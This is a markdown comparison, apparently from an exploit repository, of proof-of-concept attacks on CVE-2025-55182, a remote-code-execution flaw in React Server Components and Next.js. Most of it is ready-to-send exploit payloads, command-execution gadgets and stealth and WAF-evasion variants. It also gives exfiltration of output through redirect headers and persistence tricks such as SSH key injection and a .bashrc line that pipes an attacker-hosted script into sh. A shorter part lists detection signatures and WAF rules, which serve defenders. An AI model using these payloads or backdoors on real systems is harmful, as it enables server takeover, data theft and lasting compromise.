# CVE-2025-55182 PoC Comparison Analysis

> Comprehensive analysis of external PoCs vs react2shell implementation.
> Last updated: 2025-12-05

## Quick Reference: Key Files

| PoC | Primary File | Location |
|-----|--------------|----------|
| lachlan2k (original) | `01-submitted-poc.js` | `./React2Shell-CVE-2025-55182-original-poc/` |
| lachlan2k (first) | `00-very-first-rce-poc` | `./React2Shell-CVE-2025-55182-original-poc/` |
| ejpir research | `exploit-all-gadgets.js` | `./CVE-2025-55182-research/` |
| ejpir persistence | `exploit-persistence.js` | `./CVE-2025-55182-research/` |
| ejpir technical | `TECHNICAL-ANALYSIS.md` | `./CVE-2025-55182-research/` |
| ejpir data URI | `poc-pure/test-data-uri-import.cjs` | `./CVE-2025-55182-research/` |
| shellinteractive | `interative.py` | `./CVE-2025-55182-shellinteractive/` |
| joe-desimone | `joe-desimone-exploit.py` | `./` (this folder) |
| react2shell | `exploit-redirect.sh` | `../` (repo root) |

---

## Executive Summary

Five distinct PoC implementations exist for CVE-2025-55182, revealing **three fundamental attack classes**:

1. **Prototype Pollution via Flight Protocol** (lachlan2k, react2shell, joe-desimone)
2. **Function Reference with #constructor** (shellinteractive)
3. **Direct Module Gadget Access** (ejpir: module#export, data URI)

The core vulnerability is identical: `requireModule()` accesses properties without `hasOwnProperty` check, enabling prototype chain traversal to reach the `Function` constructor.

---

## Attack Vector Deep Dive

### Attack Class 1: Prototype Pollution (Primary Vector)

**Used by:** lachlan2k, react2shell, joe-desimone

**Mechanism:** Abuse `getOutlinedModel()` in `ReactFlightClient.js` which traverses property paths:

```javascript
// Vulnerable code (ReactFlightClient.js)
for (key = 1; key < reference.length; key++)
  parentObject = parentObject[reference[key]];  // No hasOwnProperty!
```

**Exploitation chain:**
1. `$@0` raw chunk reference gives access to a Chunk object
2. `$1:__proto__:then` traverses to `Chunk.prototype.then`
3. Fake chunk with `status: "resolved_model"` triggers `initializeModelChunk()`
4. `_response._formData.get` points to `$1:constructor:constructor` → Function
5. `_response._prefix` contains attacker code
6. `$B0` blob reference triggers `Function(_prefix + blobId)` → RCE

**Why no Action ID needed:** Multipart form parsing feeds chunks to Flight deserializer immediately. RCE occurs during deserialization, BEFORE Next.js validates the action ID.

### Attack Class 2: $F Function Reference (shellinteractive)

**Used by:** shellinteractive (CVE-2025-55182-shellinteractive)

**Mechanism:** Uses Flight's function reference syntax with manifest lookup:

```python
# From: ./CVE-2025-55182-shellinteractive/interative.py:90-94
multipart_data = {
    '0': (None, '"$F1"'),
    '1': (None, '{"id": "action_id#constructor", "bound": "$@2"}'),
    '2': (None, '["{CODE}"]')
}
```

**Exploitation chain:**
1. `$F1` tells Flight to load chunk 1 as a server function reference
2. `{id: "action#constructor", bound: "$@2"}` triggers `loadServerReference()`
3. Manifest lookup for `action` succeeds, then `#constructor` appended
4. `module.constructor` returns `Function`
5. `bound` args from chunk 2 become Function body
6. `Function.bind(null, CODE)()` → RCE

**Key limitation:** Requires valid action ID in manifest. Without it → 404.

### Attack Class 3: Direct Module Gadget (ejpir)

**Used by:** ejpir research

**Mechanism A - module#export syntax:**
```javascript
// From: ./CVE-2025-55182-research/exploit-all-gadgets.js
{ id: 'vm#runInThisContext', bound: ['CODE'] }
{ id: 'child_process#execSync', bound: ['whoami'] }
{ id: 'fs#readFileSync', bound: ['/etc/passwd'] }
```

**Mechanism B - Data URI import (unbundled only):**
```javascript
// From: ./CVE-2025-55182-research/poc-pure/test-data-uri-import.cjs
$ACTION_ID_data:text/javascript;base64,{BASE64_CODE}#default
```

The unbundled RSC version calls raw `import(specifier)` without manifest validation.

---

## PoC-by-PoC Analysis

### 1. lachlan2k (Original Discoverer)

**Files:**
- `./React2Shell-CVE-2025-55182-original-poc/01-submitted-poc.js` - Main PoC
- `./React2Shell-CVE-2025-55182-original-poc/00-very-first-rce-poc` - Complex first attempt
- `./React2Shell-CVE-2025-55182-original-poc/02-meow-rce-poc` - Minimal variant

**Payload structure (5 chunks):**
```javascript
// From: ./React2Shell-CVE-2025-55182-original-poc/01-submitted-poc.js:1-19
const payload = {
    '0': '$1',
    '1': {
        'status':'resolved_model',
        'reason':0,
        '_response':'$4',
        'value':'{"then":"$3:map","0":{"then":"$B3"},"length":1}',
        'then':'$2:then'
    },
    '2': '$@3',
    '3': [],
    '4': {
        '_prefix':'console.log(7*7+1)//',
        '_formData':{'get':'$3:constructor:constructor'},
        '_chunks':'$2:_response:_chunks',
    }
}
```

**Novel mechanisms:**
- **Array.map chaining:** `"then":"$3:map"` passes resolve to `Array.prototype.map`
- **Multi-hop gadgets:** Enables "hopping" between chunks via `$0` definitions
- **5-chunk structure:** More complex but more flexible than 2-chunk approach
- **Waku support:** Also works against Waku RSC framework

**Output:** `console.log()` only (blind execution, no exfiltration)

### 2. react2shell (This Repository)

**Files:**
- `../exploit-redirect.sh` - Primary exploit (HTTP 303 + header exfil)
- `../exploit-throw.sh` - Dev mode only (HTTP 500 + body exfil)
- `../exploit-reflect.sh` - Stealth mode (HTTP 200, needs action ID)
- `../exploit-urlencoded.sh` - WAF evasion variant
- `../shell.sh` - Interactive shell with CWD tracking
- `../exfil-file.sh` - Chunked file exfiltration

**Payload structure (2 chunks - minimal):**
```json
// Chunk 0
{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B0\"}",
  "_response": {
    "_prefix": "PAYLOAD_CODE",
    "_formData": {"get": "$1:constructor:constructor"}
  }
}
// Chunk 1
"$@0"
```

**Novel mechanisms:**

1. **NEXT_REDIRECT exfiltration** (`exploit-redirect.sh`):
   ```javascript
   // Creates redirect error with output in digest
   var e = new Error();
   e.digest = 'NEXT_REDIRECT;push;http://x/' + base64(output) + ';307;';
   throw e;
   ```
   - Output appears in `x-action-redirect` header
   - Works in production (digest not sanitized)
   - HTTP 303 response

2. **Reflect mode** (`exploit-reflect.sh`):
   ```javascript
   arguments[0]([execSync('CMD').toString()]);
   ```
   - Resolves Promise with output as action argument
   - HTTP 200 (stealthiest)
   - Requires valid action ID

3. **URL-encoded variant** (`exploit-urlencoded.sh`):
   - `application/x-www-form-urlencoded` instead of multipart
   - Different WAF signature (no boundary patterns)
   - Requires valid action ID

4. **Interactive shell** (`shell.sh`):
   - CWD tracking across commands
   - Readline history support
   - File download integration

### 3. joe-desimone

**File:** `./joe-desimone-exploit.py`

**Payload structure (3 chunks):**
```python
# From: ./joe-desimone-exploit.py:51-67
payload_0 = (
    '{"then":"$1:__proto__:then",'
    '"status":"resolved_model",'
    '"reason":-1,'
    '"value":"{\\\"then\\\":\\\"$B1337\\\"}",'  # Uses $B1337
    '"_response":{'
    '"_prefix":"process.mainModule.require(\'child_process\').execSync(\'' + cmd + '\');",'
    '"_chunks":"$Q2",'
    '"_formData":{"get":"$1:constructor:constructor"}'
    '}}'
)
# Plus: '1': '"$@0"', '2': '[]'
```

**Novel mechanisms:**
- Python implementation with `requests` library
- Reverse shell helper (`--revshell IP PORT`)
- Output exfiltration via callback (`--exfil CMD IP PORT`)
- Timeout-based success detection (blind mode)
- Uses `$B1337` (arbitrary blob ID)

### 4. shellinteractive

**File:** `./CVE-2025-55182-shellinteractive/interative.py`

**Payload structure (3 chunks, $F reference):**
```python
# From: ./CVE-2025-55182-shellinteractive/interative.py:90-94
multipart_data = {
    '0': (None, '"$F1"'),
    '1': (None, json.dumps({"id": f"{action_id}#constructor", "bound": "$@2"})),
    '2': (None, f'["{code}"]')
}
```

**Code execution approach:**
```javascript
// From: ./CVE-2025-55182-shellinteractive/interative.py:75-85
return import('child_process').then(cp => {
    try {
        const output = cp.execSync(cmd).toString();
        return output;
    } catch(e) {
        return "Command Execution Failed: " + e.message;
    }
});
```

**Novel mechanisms:**
- **$F function reference path** (different from proto pollution)
- Interactive REPL with command history
- File upload capability (echo content to file)
- File download (base64 cat)
- Built-in test suite (`id`, `whoami`, `pwd`, etc.)

**Key difference:** Uses `import()` for async child_process access vs `process.mainModule.require()`.

### 5. ejpir Research

**Files:**
- `./CVE-2025-55182-research/TECHNICAL-ANALYSIS.md` - Full technical writeup
- `./CVE-2025-55182-research/exploit-all-gadgets.js` - Gadget catalog
- `./CVE-2025-55182-research/exploit-persistence.js` - fs-only attacks
- `./CVE-2025-55182-research/exploit-obscure-gadgets.js` - Alternative gadgets
- `./CVE-2025-55182-research/poc-pure/*.cjs` - Pure JS test cases

**Attack paths documented:**

1. **module#export gadgets:**
   ```javascript
   // From: ./CVE-2025-55182-research/exploit-all-gadgets.js
   { id: 'vm#runInThisContext', bound: ['CODE'] }           // Direct RCE
   { id: 'child_process#execSync', bound: ['whoami'] }      // Shell
   { id: 'child_process#execFileSync', bound: ['/bin/id'] } // Binary
   { id: 'fs#readFileSync', bound: ['/etc/passwd'] }        // File read
   { id: 'fs#writeFileSync', bound: ['/tmp/x', 'data'] }    // File write
   { id: 'module#_load', bound: ['/tmp/evil.js'] }          // Two-step RCE
   ```

2. **Data URI import (unbundled only):**
   ```javascript
   // From: ./CVE-2025-55182-research/poc-pure/test-data-uri-import.cjs
   const dataUri = `data:text/javascript;base64,${base64(code)}`;
   import(dataUri);  // RCE during import!
   ```

3. **Persistence attacks (fs-only):**
   ```javascript
   // From: ./CVE-2025-55182-research/exploit-persistence.js
   // SSH key injection
   fs.appendFileSync('~/.ssh/authorized_keys', '\nssh-rsa ATTACKER_KEY...')
   // Shell backdoor
   fs.appendFileSync('~/.bashrc', '\ncurl http://attacker/shell.sh | sh')
   // Source tampering
   fs.writeFileSync('node_modules/...', 'malicious code')
   ```

**Gadget availability analysis:**
| Module | Likelihood in Bundle | Impact |
|--------|---------------------|--------|
| `fs` | Very High | File R/W, indirect RCE |
| `child_process` | Medium | Direct RCE |
| `vm` | Low | Direct RCE |
| `module` | Very Low | Two-step RCE |

---

## Comparison Tables

### Payload Structure

| PoC | Chunks | Proto Pollution | $F Ref | Action ID |
|-----|--------|-----------------|--------|-----------|
| lachlan2k | 5 | Yes (`$3:map`) | No | No |
| react2shell | 2 | Yes (`$1:__proto__`) | No | No |
| joe-desimone | 3 | Yes (`$1:__proto__`) | No | No |
| shellinteractive | 3 | No | Yes | **Required** |
| ejpir | Varies | Both paths | Yes | Varies |

### Output Capture Methods

| PoC | Method | HTTP Status | Production Safe |
|-----|--------|-------------|-----------------|
| lachlan2k | console.log | 200 (hangs) | Blind only |
| react2shell redirect | `x-action-redirect` header | 303 | **Yes** |
| react2shell throw | Error message body | 500 | Dev only |
| react2shell reflect | RSC response body | 200 | **Yes** |
| joe-desimone | Timeout detection | Varies | Blind only |
| shellinteractive | Response body | 200 | Yes (needs ID) |

### Tooling Comparison

| Feature | react2shell | shellinteractive | joe-desimone |
|---------|-------------|------------------|--------------|
| Interactive shell | Yes (`shell.sh`) | Yes (REPL) | No |
| CWD tracking | Yes | No | No |
| File download | Yes (`exfil-file.sh`) | Yes (base64) | No |
| File upload | No | Yes (echo) | No |
| Chunked exfil | Yes | No | No |
| Reverse shell | No (use OOB) | No | Yes |
| Detection script | Yes (`detect.sh`) | Yes | Yes |
| Language | Bash | Python | Python |

---

## Detection Signatures

All PoCs share these patterns:

**HTTP Headers:**
```
Next-Action: x                    # Invalid action (proto pollution)
Next-Action: {valid-hash}         # Valid action ($F path)
Content-Type: multipart/form-data # Most exploits
Content-Type: application/x-www-form-urlencoded  # URL-encoded variant
```

**Payload Patterns:**
```
$1:__proto__:then        # Prototype traversal
$1:constructor:constructor  # Function constructor access
$@0, $@1, $@2            # Raw chunk references
$B0, $B1337              # Blob references (trigger)
$F1                      # Function reference
#constructor             # Export name targeting prototype
```

**WAF Rules (block requests containing):**
```
$1:__proto__
$1:constructor:constructor
"then":"$B
#constructor
vm#runInThisContext
child_process#execSync
module#_load
```

---

## Novel Contributions Summary

| PoC | Primary Innovation |
|-----|-------------------|
| **lachlan2k** | Original discovery, Array.map chunk chaining, 5-chunk structure |
| **react2shell** | Production exfil via NEXT_REDIRECT, minimal 2-chunk, reflect mode, shell/exfil tooling |
| **joe-desimone** | Python ecosystem, reverse shell/exfil helpers, timeout detection |
| **shellinteractive** | $F reference vector, interactive REPL, file upload/download |
| **ejpir** | Gadget catalog, persistence attacks, data URI path, comprehensive technical analysis |

---

## Key Insights

### Why Proto Pollution Doesn't Need Action ID

From `action-handler.ts` in Next.js:
- Multipart parsing triggers Flight deserialization immediately
- RCE occurs in `getOutlinedModel()` during chunk reference resolution
- Action ID validation happens AFTER deserialization completes
- URL-encoded requests validate action ID FIRST (different code path)

### Why shellinteractive Needs Action ID

The `$F` reference triggers `loadServerReference()`:
```javascript
function loadServerReference(bundlerConfig, id, bound) {
  var serverReference = resolveServerReference(bundlerConfig, id);
  // ↑ Manifest lookup happens here - fails if action doesn't exist
```

### Production vs Development Behavior

| Behavior | Development | Production |
|----------|-------------|------------|
| Error messages | Full stack trace | Sanitized (digest only) |
| `throw` exfil | Works (message visible) | **Fails** (message stripped) |
| `redirect` exfil | Works | **Works** (digest not stripped) |
| reflect exfil | Works | Works |

---

## References

### External Sources
- [lachlan2k original PoC](https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc)
- [joe-desimone gist](https://gist.github.com/joe-desimone/ff0cae0aa0d20965d502e7a97cbde3e3)
- [ejpir research](https://github.com/ejpir/CVE-2025-55182-research)
- [shellinteractive (labubusDest)](https://github.com/labubusDest/CVE-2025-55182-shellinteractive) - Original $F reference PoC
- [shellinteractive (MrR0b0t19)](https://github.com/MrR0b0t19/CVE-2025-55182-shellinteractive) - Enhanced fork with additional features

### Local File Quick Access
```bash
# View lachlan2k original
cat ./React2Shell-CVE-2025-55182-original-poc/01-submitted-poc.js

# View ejpir gadget catalog
cat ./CVE-2025-55182-research/exploit-all-gadgets.js

# View shellinteractive exploit
cat ./CVE-2025-55182-shellinteractive/interative.py

# View react2shell redirect exploit
cat ../exploit-redirect.sh

# View react2shell interactive shell
cat ../shell.sh
```

---

## Appendix: Raw Payload Examples

### Proto Pollution (react2shell - 2 chunk)
```
------WebKitFormBoundary
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B0\"}","_response":{"_prefix":"CODE","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundary
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundary--
```

### $F Reference (shellinteractive - 3 chunk)
```
------WebKitFormBoundary
Content-Disposition: form-data; name="0"

"$F1"
------WebKitFormBoundary
Content-Disposition: form-data; name="1"

{"id":"action#constructor","bound":"$@2"}
------WebKitFormBoundary
Content-Disposition: form-data; name="2"

["CODE"]
------WebKitFormBoundary--
```

### Array.map Chaining (lachlan2k - 5 chunk)
```
0=$1
1={"status":"resolved_model","reason":0,"_response":"$4","value":"{\"then\":\"$3:map\",\"0\":{\"then\":\"$B3\"},\"length\":1}","then":"$2:then"}
2=$@3
3=[]
4={"_prefix":"CODE","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}
```
